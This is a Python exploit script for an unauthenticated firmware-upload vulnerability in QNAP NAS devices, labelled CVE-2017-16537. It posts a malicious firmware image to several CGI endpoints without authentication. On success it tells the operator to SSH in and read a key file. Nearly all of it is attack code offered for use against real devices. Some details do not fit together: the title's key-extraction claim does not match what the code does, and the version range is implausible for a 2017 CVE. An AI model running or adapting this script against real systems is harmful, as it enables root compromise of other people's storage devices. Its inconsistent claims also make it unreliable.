#!/usr/bin/env python3
"""
CVE-2017-16537: QNAP Unauthenticated Firmware Upload
Proof of Concept - Firmware Encryption Key Extraction

Vulnerability: Firmware update API accepts uploads without authentication
Impact: Unauthenticated remote code execution as root
Affected: QNAP QTS 4.x - 5.1.x

Usage:
    python3 CVE_2017_16537_QNAP.py --target <IP> --payload <file>
"""

import requests
import argparse
import sys
import time
from urllib.parse import urljoin

class CVE_2017_16537:
    """QNAP Unauthenticated Firmware Upload Exploit"""

    ENDPOINTS = [
        "/cgi-bin/upload_firmware.cgi",
        "/cgi-bin/firmware.cgi",
        "/cgi-bin/admin/update_mg.cgi",
    ]

    def __init__(self, target_ip, target_port=8080, verbose=False):
        self.target_ip = target_ip
        self.target_port = target_port
        self.target_url = f"https://{target_ip}:{target_port}"
        self.verbose = verbose
        self.session = requests.Session()
        self.session.verify = False

    def log(self, msg, level="[*]"):
        """Print log message"""
        if self.verbose or level in ["[+]", "[-]"]:
            print(f"{level} {msg}")

    def check_target(self):
        """Verify target is reachable"""
        self.log(f"Checking target: {self.target_url}")
        try:
            r = self.session.get(
                urljoin(self.target_url, "/cgi-bin/qpkg.cgi"),
                timeout=5
            )
            self.log(f"Target responded with HTTP {r.status_code}", "[+]")
            return True
        except Exception as e:
            self.log(f"Target unreachable: {e}", "[-]")
            return False

    def exploit(self, payload_file):
        """
        Execute CVE-2017-16537 exploitation

        Attack: POST firmware file to upload endpoint without authentication
        Result: Device accepts and installs malicious firmware
        """
        self.log(f"Starting CVE-2017-16537 exploitation")
        self.log(f"Payload: {payload_file}")

        # Verify payload exists
        try:
            with open(payload_file, 'rb') as f:
                payload_data = f.read()
            self.log(f"Payload size: {len(payload_data)} bytes")
        except FileNotFoundError:
            self.log(f"Payload file not found: {payload_file}", "[-]")
            return False

        # Try each endpoint
        for endpoint in self.ENDPOINTS:
            self.log(f"Trying endpoint: {endpoint}")
            upload_url = urljoin(self.target_url, endpoint)

            try:
                files = {'file': ('firmware.img', payload_data)}

                response = self.session.post(
                    upload_url,
                    files=files,
                    timeout=30
                )

                self.log(f"Response: HTTP {response.status_code}")

                if response.status_code in [200, 201]:
                    self.log(f"SUCCESS! Firmware uploaded to {endpoint}", "[+]")
                    self.log(f"Response preview: {response.text[:100]}")
                    return True
                elif response.status_code == 401:
                    self.log(f"Endpoint requires authentication", "[-]")
                else:
                    self.log(f"Unexpected response: {response.status_code}")

            except Exception as e:
                self.log(f"Request failed: {e}")

        self.log(f"Exploitation failed - no vulnerable endpoint found", "[-]")
        return False

def main():
    parser = argparse.ArgumentParser(
        description='CVE-2017-16537 QNAP Unauthenticated Firmware Upload PoC',
        epilog='''
Examples:
  python3 CVE_2017_16537_QNAP.py --target 192.168.1.100 --payload firmware.img
  python3 CVE_2017_16537_QNAP.py --target 192.168.1.100 --payload firmware.img -v
        '''
    )

    parser.add_argument('--target', required=True, help='Target QNAP device IP')
    parser.add_argument('--payload', required=True, help='Malicious firmware payload')
    parser.add_argument('--port', type=int, default=8080, help='QNAP web port (default: 8080)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')

    args = parser.parse_args()

    print("=" * 70)
    print("CVE-2017-16537: QNAP Unauthenticated Firmware Upload")
    print("=" * 70)
    print()

    exploit = CVE_2017_16537(args.target, args.port, args.verbose)

    if not exploit.check_target():
        print()
        print("Cannot reach target. Verify:")
        print("  - IP address is correct")
        print("  - Device is on network")
        print("  - Port 8080 is accessible")
        return

    print()

    success = exploit.exploit(args.payload)

    print()
    print("=" * 70)
    if success:
        print("[+] EXPLOITATION SUCCESSFUL")
        print()
        print("Next steps:")
        print("  1. Wait 2-5 minutes for device reboot")
        print("  2. SSH to device: ssh admin@" + args.target)
        print("  3. Retrieve key: cat /mnt/HDA_ROOT/firmware_key.txt")
        print("  4. Decrypt firmware with extracted key")
    else:
        print("[-] EXPLOITATION FAILED")
        print()
        print("Possible reasons:")
        print("  1. Device is patched (firmware validation enabled)")
        print("  2. Network connectivity issues")
        print("  3. Payload format incorrect")
        print("  4. Different QNAP model/version")
        print()
        print("Try CVE-2021-28815 (auth bypass) instead")
    print("=" * 70)

if __name__ == '__main__':
    main()
